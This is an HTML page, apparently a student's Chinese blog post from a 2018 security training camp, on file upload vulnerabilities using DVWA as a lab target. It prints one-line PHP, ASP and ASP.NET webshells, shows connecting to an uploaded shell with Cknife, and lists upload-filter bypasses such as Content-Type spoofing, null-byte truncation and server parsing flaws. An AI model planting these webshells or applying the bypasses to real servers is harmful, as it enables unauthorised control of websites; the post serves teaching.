@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="韩舒学姐（相当温柔）今天给我们讲解了文件上传漏洞，以及Anrwsord和Cknife等工具的使用。">
+<meta name="keywords" content="Bin,ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="集训第六天：文件上传漏洞">
+<meta property="og:url" content="http://yoursite.com/2018/07/06/fourth/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="韩舒学姐（相当温柔）今天给我们讲解了文件上传漏洞，以及Anrwsord和Cknife等工具的使用。">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://i.imgur.com/3aVNrof.png">
+<meta property="og:image" content="https://i.imgur.com/ZF5MQjC.png">
+<meta property="og:image" content="https://i.imgur.com/esc9y66.png">
+<meta property="og:updated_time" content="2018-07-06T14:56:07.267Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="集训第六天：文件上传漏洞">
+<meta name="twitter:description" content="韩舒学姐（相当温柔）今天给我们讲解了文件上传漏洞，以及Anrwsord和Cknife等工具的使用。">
+<meta name="twitter:image" content="https://i.imgur.com/3aVNrof.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>集训第六天：文件上传漏洞</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/projects_url">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2018/07/05/third/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/07/06/fourth/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/07/06/fourth/&text=集训第六天：文件上传漏洞"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/07/06/fourth/&title=集训第六天：文件上传漏洞"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/07/06/fourth/&is_video=false&description=集训第六天：文件上传漏洞"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=集训第六天：文件上传漏洞&body=Check out this article: http://yoursite.com/2018/07/06/fourth/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/07/06/fourth/&title=集训第六天：文件上传漏洞"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/07/06/fourth/&title=集训第六天：文件上传漏洞"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/07/06/fourth/&title=集训第六天：文件上传漏洞"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/07/06/fourth/&title=集训第六天：文件上传漏洞"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/07/06/fourth/&name=集训第六天：文件上传漏洞&description=&lt;p&gt;韩舒学姐（相当温柔）今天给我们讲解了文件上传漏洞，以及Anrwsord和Cknife等工具的使用。&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#文件上传漏洞"><span class="toc-number">1.</span> <span class="toc-text">文件上传漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#木马"><span class="toc-number">1.1.</span> <span class="toc-text">木马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#shell-exec"><span class="toc-number">1.1.1.</span> <span class="toc-text">shell_exec()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#eval"><span class="toc-number">1.1.2.</span> <span class="toc-text">eval()</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Cknife（菜刀）"><span class="toc-number">2.</span> <span class="toc-text">Cknife（菜刀）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#DVWA’s-File-Upload"><span class="toc-number">2.1.</span> <span class="toc-text">DVWA’s File Upload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#写出一句话木马"><span class="toc-number">2.1.1.</span> <span class="toc-text">写出一句话木马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#上传一句话木马直接在网页查到文件"><span class="toc-number">2.1.2.</span> <span class="toc-text">上传一句话木马直接在网页查到文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cknife连接"><span class="toc-number">2.1.3.</span> <span class="toc-text">Cknife连接</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#文件上传漏洞检测"><span class="toc-number">3.</span> <span class="toc-text">文件上传漏洞检测</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#客户端javascript检测"><span class="toc-number">3.1.</span> <span class="toc-text">客户端javascript检测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#服务端检测绕过（MIME类型检测）"><span class="toc-number">3.2.</span> <span class="toc-text">服务端检测绕过（MIME类型检测）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#服务端目录路径检测"><span class="toc-number">3.3.</span> <span class="toc-text">服务端目录路径检测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#服务端文件扩展名检测"><span class="toc-number">3.4.</span> <span class="toc-text">服务端文件扩展名检测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#黑名单检测"><span class="toc-number">3.4.1.</span> <span class="toc-text">黑名单检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#白名单检测"><span class="toc-number">3.4.2.</span> <span class="toc-text">白名单检测</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#服务端文件内容检测"><span class="toc-number">3.5.</span> <span class="toc-text">服务端文件内容检测</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index my4">
+    <a href="https://github.com/Shmilylbj"><img style="position: absolute; top: 0; left: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_left_darkblue_121621.png" alt="Fork me on GitHub"></a>
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        集训第六天：文件上传漏洞
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Hexo</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2018-07-06T14:24:45.000Z" itemprop="datePublished">2018-07-06</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/Bin/">Bin</a>, <a class="tag-link" href="/tags/ctf/">ctf</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>韩舒学姐（相当温柔）今天给我们讲解了文件上传漏洞，以及Anrwsord和Cknife等工具的使用。</p>
+<a id="more"></a>
+<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>上传的文件不进行限制，有可能会被利用于上传可执行文件、脚本到服务器上，并且通过脚本文件可以获得执行服务器端命令的能力</p>
+<h2 id="木马"><a href="#木马" class="headerlink" title="木马"></a>木马</h2><p>根据语言分类，有PHP、ASP、JSP、ASP.NET等不同语言下的木马；根据作用分类，有大马和小马</p>
+<p>PHP一句话木马：</p>
+<p>&lt;?php ehco shell_exec($_GET[‘a’]); ?&gt;</p>
+<p>&lt;?php ehco shell_exec($_POST[‘a’]); ?&gt;</p>
+<p>&lt;?php @eval($_POST[‘a’]); ?&gt;</p>
+<p>ASP一句话木马：</p>
+<p>&lt;%eval request(“Cknife”)%&gt;</p>
+<p>ASP.NET一句话木马：</p>
+<p>&lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[“Cknife”],”unsafe”);%&gt;</p>
+<h3 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h3><p>通过环境执行命令，并且将完整的输出以字符串的方式返回</p>
+<h3 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h3><p>把字符串作为PHP代码执行执行a接收到的内容</p>
+<h1 id="Cknife（菜刀）"><a href="#Cknife（菜刀）" class="headerlink" title="Cknife（菜刀）"></a>Cknife（菜刀）</h1><p>超级强大的网站管理工，分为客户端和代码两部分</p>
+<p>只要将那简短的一句话代码放到网站上去就可以取得网站的权限</p>
+<p>运行环境：安装了JRE1.7+环境的所有操作系统</p>
+<p>主要功能：文件管理、虚拟终端、数据库管理</p>
+<h2 id="DVWA’s-File-Upload"><a href="#DVWA’s-File-Upload" class="headerlink" title="DVWA’s File Upload"></a>DVWA’s File Upload</h2><p>low level的测试一下，源码中没有对任何文件格式进行过滤：</p>
+<h3 id="写出一句话木马"><a href="#写出一句话木马" class="headerlink" title="写出一句话木马"></a>写出一句话木马</h3><p>用菜刀连接的一句话木马：</p>
+<p>&lt;?php @eval($_POST[‘a’]; ?&gt;</p>
+<p>直接在网页下通过GET的一句话木马：</p>
+<p>&lt;?php echo shell_exec($_GET[‘a’]); ?&gt;</p>
+<p>在网页下用hackbar通过POST的一句话木马：</p>
+<p>&lt;?php echo shell_exec($_POST[‘a’]); ?&gt;</p>
+<h3 id="上传一句话木马直接在网页查到文件"><a href="#上传一句话木马直接在网页查到文件" class="headerlink" title="上传一句话木马直接在网页查到文件"></a>上传一句话木马直接在网页查到文件</h3><p><img src="https://i.imgur.com/3aVNrof.png" alt="">get</p>
+<p><img src="https://i.imgur.com/ZF5MQjC.png" alt="">post</p>
+<h3 id="Cknife连接"><a href="#Cknife连接" class="headerlink" title="Cknife连接"></a>Cknife连接</h3><p><img src="https://i.imgur.com/esc9y66.png" alt="">连接后可以得到目标服务器下所有文件</p>
+<p>源码：</p>
+<p> &lt;?php<br>    if (isset($_POST[‘Upload’])) {</p>
+<pre><code>    $target_path = 
+    DVWA_WEB_PAGE_TO_ROOT.&quot;hackable/uploads/&quot;;
+    //上传路径为../../hackable/uploads/
+    $target_path = $target_path . basename( $_FILES[&apos;uploaded&apos;][&apos;name&apos;]);
+    //上传路径加上上传的文件名
+    if(!move_uploaded_file($_FILES[&apos;uploaded&apos;][&apos;tmp_name&apos;], $target_path)) {
+     //对是否上传成功做出判断，因此所有格式的文件都能上传
+        echo &apos;&lt;pre&gt;&apos;;
+        echo &apos;Your image was not uploaded.&apos;;
+        echo &apos;&lt;/pre&gt;&apos;;
+      } else {
+        echo &apos;&lt;pre&gt;&apos;;
+        echo $target_path . &apos; succesfully uploaded!&apos;;
+        echo &apos;&lt;/pre&gt;&apos;;
+    }
+}
+</code></pre><p>?&gt;</p>
+<h1 id="文件上传漏洞检测"><a href="#文件上传漏洞检测" class="headerlink" title="文件上传漏洞检测"></a>文件上传漏洞检测</h1><p>客户端javascript检测：通常在本地检测文件的扩展名</p>
+<p>服务端MIME类型检测：通常检测的是Content-Type内容</p>
+<p>服务端目录路径检测：通常根path参数相关的内容</p>
+<p>服务端文件扩展名检测：通常检测跟文件extension相关的内容</p>
+<p>服务端文件内容检测：检测文件内容是否合法或含有恶意代码</p>
+<h2 id="客户端javascript检测"><a href="#客户端javascript检测" class="headerlink" title="客户端javascript检测"></a>客户端javascript检测</h2><p>在客户端使用js对不合法图片进行检查</p>
+<p>绕过：</p>
+<p>禁用页面js</p>
+<p>先把文件改成符合条件的文件格式上传，在抓包，修改文件的后缀名</p>
+<h2 id="服务端检测绕过（MIME类型检测）"><a href="#服务端检测绕过（MIME类型检测）" class="headerlink" title="服务端检测绕过（MIME类型检测）"></a>服务端检测绕过（MIME类型检测）</h2><p>通过判断$_FILES[‘userfile’][‘type’]!=”imgae/gif”来保证上传的文件类型为gif</p>
+<p>绕过：通过burp抓包，将原来的Content-Type类型改为符合要求的类型</p>
+<p>Content-Type: application/octet-stream</p>
+<p>application/octet-stream即为php文件的文件类型格式</p>
+<h2 id="服务端目录路径检测"><a href="#服务端目录路径检测" class="headerlink" title="服务端目录路径检测"></a>服务端目录路径检测</h2><p>上传路径为“/image/20160704”时，可以通过修改为“image/20160704/eval.php%00filename.gif”</p>
+<p>通过%00截断最终导致存储的文件名为eval.php</p>
+<h2 id="服务端文件扩展名检测"><a href="#服务端文件扩展名检测" class="headerlink" title="服务端文件扩展名检测"></a>服务端文件扩展名检测</h2><p>分为黑名单检测和白名单检测</p>
+<h3 id="黑名单检测"><a href="#黑名单检测" class="headerlink" title="黑名单检测"></a>黑名单检测</h3><p>接收上传的文件做对比，如果匹配到黑名单中的后缀名，则不允许上传</p>
+<p>绕过：</p>
+<p>后缀名大小写绕过 ,例如:将Burpsuite截获的数据包中的文件名“evil.php”改“evil.Php”</p>
+<p>名单列表绕过，尝试使用非黑名单内的后缀名，如php5，php7等</p>
+<p>特殊文件名绕过（只适用windows，将文件名改为“evil.php.”或“evil.php”（注意这里有一个空格)。在windows下，不允许这样的命 名，所以会将.和空格自动去掉）。</p>
+<p>0x00截断绕过：在上传的时候，当文件系统读到0x00时，会认为文件已经结束。例如：“1.php%00.jpg”，验证扩展名是“.jpg”，但写入的时候是“1.php”文件</p>
+<h3 id="白名单检测"><a href="#白名单检测" class="headerlink" title="白名单检测"></a>白名单检测</h3><p>接收上传的文件做扩展名匹配，匹配上的白名单中的扩展名的文件才能上传</p>
+<p>绕过：</p>
+<p>0x00阶段绕过</p>
+<p>解析漏洞绕过：（1）apache解析文件名是从右到左识别扩展名，如“eval.php.jpg”，文件为php文件，不能解析jpg会向前解析php</p>
+<p>（2）IIS6.0目录名包含“.asp、.asa、.cer”的话，则该目录下的所有文件都将按照asp解析。</p>
+<p>（3）IIS6.0不解析;后面的，所以提交“evil.asp;.html”解析为asp类型</p>
+<p>（4）Nginx解析漏洞：将php文件换成其他可以通过的文件后缀，访问的时候在后面加上“eval.php.jpg”，如“evil.jpg/.php”，“evil.jpg”会解析为php的格式</p>
+<h2 id="服务端文件内容检测"><a href="#服务端文件内容检测" class="headerlink" title="服务端文件内容检测"></a>服务端文件内容检测</h2><p>图像类文件内容检测</p>
+<p>文件幻数检测（图片头格式检测）：</p>
+<p>（1）jpg内容头value= FF D8 FF E0 00 10 4A 46 49 46</p>
+<p>（2）gif内容头value= 47 49 46 38 39 61</p>
+<p>（3）png内容头value= 89 50 4E 47</p>
+<p>绕过：在文件头后加上一句话木马就能绕过</p>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/projects_url">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#文件上传漏洞"><span class="toc-number">1.</span> <span class="toc-text">文件上传漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#木马"><span class="toc-number">1.1.</span> <span class="toc-text">木马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#shell-exec"><span class="toc-number">1.1.1.</span> <span class="toc-text">shell_exec()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#eval"><span class="toc-number">1.1.2.</span> <span class="toc-text">eval()</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Cknife（菜刀）"><span class="toc-number">2.</span> <span class="toc-text">Cknife（菜刀）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#DVWA’s-File-Upload"><span class="toc-number">2.1.</span> <span class="toc-text">DVWA’s File Upload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#写出一句话木马"><span class="toc-number">2.1.1.</span> <span class="toc-text">写出一句话木马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#上传一句话木马直接在网页查到文件"><span class="toc-number">2.1.2.</span> <span class="toc-text">上传一句话木马直接在网页查到文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cknife连接"><span class="toc-number">2.1.3.</span> <span class="toc-text">Cknife连接</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#文件上传漏洞检测"><span class="toc-number">3.</span> <span class="toc-text">文件上传漏洞检测</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#客户端javascript检测"><span class="toc-number">3.1.</span> <span class="toc-text">客户端javascript检测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#服务端检测绕过（MIME类型检测）"><span class="toc-number">3.2.</span> <span class="toc-text">服务端检测绕过（MIME类型检测）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#服务端目录路径检测"><span class="toc-number">3.3.</span> <span class="toc-text">服务端目录路径检测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#服务端文件扩展名检测"><span class="toc-number">3.4.</span> <span class="toc-text">服务端文件扩展名检测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#黑名单检测"><span class="toc-number">3.4.1.</span> <span class="toc-text">黑名单检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#白名单检测"><span class="toc-number">3.4.2.</span> <span class="toc-text">白名单检测</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#服务端文件内容检测"><span class="toc-number">3.5.</span> <span class="toc-text">服务端文件内容检测</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/07/06/fourth/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/07/06/fourth/&text=集训第六天：文件上传漏洞"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/07/06/fourth/&title=集训第六天：文件上传漏洞"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/07/06/fourth/&is_video=false&description=集训第六天：文件上传漏洞"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=集训第六天：文件上传漏洞&body=Check out this article: http://yoursite.com/2018/07/06/fourth/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/07/06/fourth/&title=集训第六天：文件上传漏洞"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/07/06/fourth/&title=集训第六天：文件上传漏洞"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/07/06/fourth/&title=集训第六天：文件上传漏洞"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/07/06/fourth/&title=集训第六天：文件上传漏洞"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/07/06/fourth/&name=集训第六天：文件上传漏洞&description=&lt;p&gt;韩舒学姐（相当温柔）今天给我们讲解了文件上传漏洞，以及Anrwsord和Cknife等工具的使用。&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    Copyright &copy; 2018 John Doe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/projects_url">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
